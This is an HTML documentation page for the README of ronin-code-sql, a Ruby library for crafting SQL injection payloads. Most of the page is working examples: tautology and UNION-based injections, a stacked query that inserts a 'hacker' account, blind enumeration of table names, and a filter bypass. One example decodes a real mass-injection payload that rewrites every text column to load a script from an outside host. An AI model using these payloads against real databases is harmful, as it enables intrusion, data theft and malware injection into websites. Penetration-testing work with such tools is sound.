<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  File: README
  
    &mdash; Ronin::Code::SQL Documentation
  
</title>

  <link rel="stylesheet" href="css/style.css" type="text/css" />

  <link rel="stylesheet" href="css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "README";
  relpath = '';
</script>


  <script type="text/javascript" charset="utf-8" src="js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="_index.html">Index</a> &raquo; 
    <span class="title">File: README</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><div id='filecontents'><h1 id="ronin-code-sql">ronin-code-sql</h1>

<p><a href="https://github.com/ronin-rb/ronin-code-sql/actions/workflows/ruby.yml"><img src="https://github.com/ronin-rb/ronin-code-sql/actions/workflows/ruby.yml/badge.svg" alt="CI"></a>
<a href="https://codeclimate.com/github/ronin-rb/ronin-code-sql"><img src="https://codeclimate.com/github/ronin-rb/ronin-code-sql.svg" alt="Code Climate"></a>
<a href="https://badge.fury.io/rb/ronin-code-sql"><img src="https://badge.fury.io/rb/ronin-code-sql.svg" alt="Gem Version"></a></p>

<ul>
<li><a href="https://github.com/ronin-rb/ronin-code-sql">Source</a></li>
<li><a href="https://github.com/ronin-rb/ronin-code-sql/issues">Issues</a></li>
<li><a href="https://ronin-rb.dev/docs/ronin-code-sql/frames">Documentation</a></li>
<li><a href="https://discord.gg/6WAb3PsVX9">Discord</a> |
<a href="https://twitter.com/ronin_rb">Twitter</a> |
<a href="https://infosec.exchange/@ronin_rb">Mastodon</a></li>
</ul>

<h2 id="description">Description</h2>

<p><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">Ronin::Code::SQL</a></span> is a Ruby DSL for crafting <a href="http://en.wikipedia.org/wiki/SQL_injection">SQL Injections (SQLi)</a>.</p>

<h3 id="features">Features</h3>

<ul>
<li>Provides convenience methods for encoding/decoding SQL data.</li>
<li>Provides an Domain Specific Language (DSL) for crafting normal SQL and
<a href="http://en.wikipedia.org/wiki/SQL_injection">SQL injections</a>.</li>
<li>Has 99% documentation coverage.</li>
<li>Has 98% test coverage.</li>
</ul>

<h2 id="examples">Examples</h2>

<h3 id="convenience-methods">Convenience Methods</h3>

<p>Escape a String:</p>

<pre class="code ruby"><code class="ruby"><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>O&#39;Brian</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_escape'>sql_escape</span>
<span class='comment'># =&gt; &quot;&#39;O&#39;&#39;Brian&#39;&quot;
</span></code></pre>

<p>Unescapes a SQL String:</p>

<pre class="code ruby"><code class="ruby"><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;O&#39;&#39;Brian&#39;</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_unescape'>sql_unescape</span>
<span class='comment'># =&gt; &quot;O&#39;Briand&quot;
</span></code></pre>

<p>Hex encode a String:</p>

<pre class="code ruby"><code class="ruby"><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exploit</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_encode'>sql_encode</span>
<span class='comment'># =&gt; &quot;0x6578706c6f6974&quot;
</span></code></pre>

<p>Hex decode a String:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_string'>string</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72</span><span class='tstring_end'>&quot;</span></span>
<span class='id identifier rubyid_string'>string</span><span class='period'>.</span><span class='id identifier rubyid_sql_decode'>sql_decode</span>
<span class='comment'># =&gt; &quot;DECLARE @T varchar(255),@C varchar(4000) DECLARE Table_Cursor CURSOR FOR select a.name,b.name from sysobjects a,syscolumns b where a.id=b.id and a.xtype=&#39;u&#39; and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM  Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN exec(&#39;update [&#39;+@T+&#39;] set [&#39;+@C+&#39;]=&#39;&#39;\&quot;&gt;&lt;/title&gt;&lt;script src=\&quot;http://www0.douhunqn.cn/csrss/w.js\&quot;&gt;&lt;/script&gt;&lt;!--&#39;&#39;+[&#39;+@C+&#39;] where &#39;+@C+&#39; not like &#39;&#39;%\&quot;&gt;&lt;/title&gt;&lt;script src=\&quot;http://www0.douhunqn.cn/csrss/w.js\&quot;&gt;&lt;/script&gt;&lt;!--&#39;&#39;&#39;)FETCH NEXT FROM  Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor&quot;
</span></code></pre>

<h3 id="sqli-dsl">SQLi DSL</h3>

<p>Injecting a <code>1=1</code> test into a Integer comparison:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='int'>1</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 OR 1=1
</span></code></pre>

<p>Injecting a <code>1=1</code> test into a String comparison:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='label'>escape:</span> <span class='symbol'>:string</span><span class='rparen'>)</span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_string'>string</span><span class='lparen'>(</span><span class='int'>1</span><span class='rparen'>)</span> <span class='op'>==</span> <span class='id identifier rubyid_string'>string</span><span class='lparen'>(</span><span class='int'>1</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1&#39; OR &#39;1&#39;=&#39;1
</span></code></pre>

<p>Columns:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_admin'>admin</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 AND admin=1
</span></code></pre>

<p>Clauses:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='int'>1</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_limit'>limit</span><span class='lparen'>(</span><span class='int'>0</span><span class='rparen'>)</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 OR 1=1 LIMIT 0
</span></code></pre>

<p>Statements:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span> <span class='int'>1</span> <span class='op'>==</span> <span class='int'>0</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_insert'>insert</span><span class='period'>.</span><span class='id identifier rubyid_into'>into</span><span class='lparen'>(</span><span class='symbol'>:users</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_values'>values</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>hacker</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>passw0rd</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>t</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 AND 1=0; INSERT INTO users VALUES (&#39;hacker&#39;,&#39;passw0rd&#39;,&#39;t&#39;)
</span></code></pre>

<p>Sub-Statements:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_union'>union</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='int'>1</span><span class='comma'>,</span><span class='int'>2</span><span class='comma'>,</span><span class='int'>3</span><span class='comma'>,</span><span class='int'>4</span><span class='comma'>,</span><span class='id identifier rubyid_id'>id</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_users'>users</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 UNION SELECT (1,2,3,4,id) FROM users
</span></code></pre>

<p>Test if a table exists:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='id identifier rubyid_count'>count</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='symbol'>:users</span><span class='rparen'>)</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 AND (SELECT COUNT(*) FROM users)=1
</span></code></pre>

<p>Create errors by using non-existent tables:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='label'>escape:</span> <span class='symbol'>:string</span><span class='rparen'>)</span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_non_existent_table'>non_existent_table</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>1</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1&#39; AND non_existent_table=&#39;1
</span></code></pre>

<p>Dumping all values of a column:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='label'>escape:</span> <span class='symbol'>:string</span><span class='rparen'>)</span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_username'>username</span><span class='period'>.</span><span class='id identifier rubyid_is_not'>is_not</span><span class='lparen'>(</span><span class='id identifier rubyid_null'>null</span><span class='rparen'>)</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_username'>username</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1&#39; OR username IS NOT NULL OR username=&#39;
</span></code></pre>

<p>Enumerate through database table names:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span>
  <span class='id identifier rubyid_ascii'>ascii</span><span class='lparen'>(</span>
    <span class='id identifier rubyid_lower'>lower</span><span class='lparen'>(</span>
      <span class='id identifier rubyid_substring'>substring</span><span class='lparen'>(</span>
        <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='symbol'>:name</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_top'>top</span><span class='lparen'>(</span><span class='int'>1</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_sysobjects'>sysobjects</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_where'>where</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_xtype'>xtype</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>U</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span><span class='comma'>,</span> <span class='int'>1</span><span class='comma'>,</span> <span class='int'>1</span>
      <span class='rparen'>)</span>
    <span class='rparen'>)</span>
  <span class='rparen'>)</span> <span class='op'>&gt;</span> <span class='int'>116</span>
<span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
<span class='comment'># 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype=&#39;U&#39;),1,1)))&gt;116
</span></code></pre>

<p>Find user supplied tables via the <code>sysObjects</code> table:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_union_all'>union_all</span> <span class='lbrace'>{</span>
  <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='int'>1</span><span class='comma'>,</span><span class='int'>2</span><span class='comma'>,</span><span class='int'>3</span><span class='comma'>,</span><span class='int'>4</span><span class='comma'>,</span><span class='int'>5</span><span class='comma'>,</span><span class='int'>6</span><span class='comma'>,</span><span class='id identifier rubyid_name'>name</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_sysObjects'>sysObjects</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_where'>where</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_xtype'>xtype</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>U</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span>
<span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_to_sql'>to_sql</span><span class='lparen'>(</span><span class='label'>terminate:</span> <span class='kw'>true</span><span class='rparen'>)</span>
<span class='comment'># 1 UNION ALL (SELECT (1,2,3,4,5,6,name) FROM sysObjects WHERE xtype=&#39;U&#39;);--
</span></code></pre>

<p>Bypass filters using <code>/**/</code> instead of spaces:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="Ronin.html" title="Ronin (module)">Ronin</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code.html" title="Ronin::Code (module)">Code</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL.html" title="Ronin::Code::SQL (module)">SQL</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html" title="Ronin::Code::SQL::Injection (class)">Injection</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="Ronin/Code/SQL/Injection.html#initialize-instance_method" title="Ronin::Code::SQL::Injection#initialize (method)">new</a></span></span>
<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_union'>union</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='int'>1</span><span class='comma'>,</span><span class='int'>2</span><span class='comma'>,</span><span class='int'>3</span><span class='comma'>,</span><span class='int'>4</span><span class='comma'>,</span><span class='id identifier rubyid_id'>id</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_users'>users</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_to_sql'>to_sql</span><span class='lparen'>(</span><span class='label'>space:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/**/</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
<span class='comment'># 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
</span></code></pre>

<h2 id="requirements">Requirements</h2>

<ul>
<li><a href="http://www.ruby-lang.org">Ruby</a> &gt;= 3.0.0</li>
<li><a href="https://github.com/ronin-rb/ronin-support#readme">ronin-support</a> ~&gt; 1.0</li>
</ul>

<h2 id="install">Install</h2>

<pre class="code shell"><code class="shell">$ gem install ronin-code-sql
</code></pre>

<h2 id="license">License</h2>

<p>ronin-code-sql - A Ruby DSL for crafting SQL Injections.</p>

<p>Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)</p>

<p>ronin-code-sql is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published
by the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.</p>

<p>ronin-code-sql is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Lesser General Public License for more details.</p>

<p>You should have received a copy of the GNU Lesser General Public License
along with ronin-code-sql.  If not, see <a href="https://www.gnu.org/licenses/">https://www.gnu.org/licenses/</a>.</p>
</div></div>

      <div id="footer">
  Generated on Thu Jun 22 21:45:35 2023 by
  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.28 (ruby-3.1.4).
</div>

    </div>
  </body>
</html>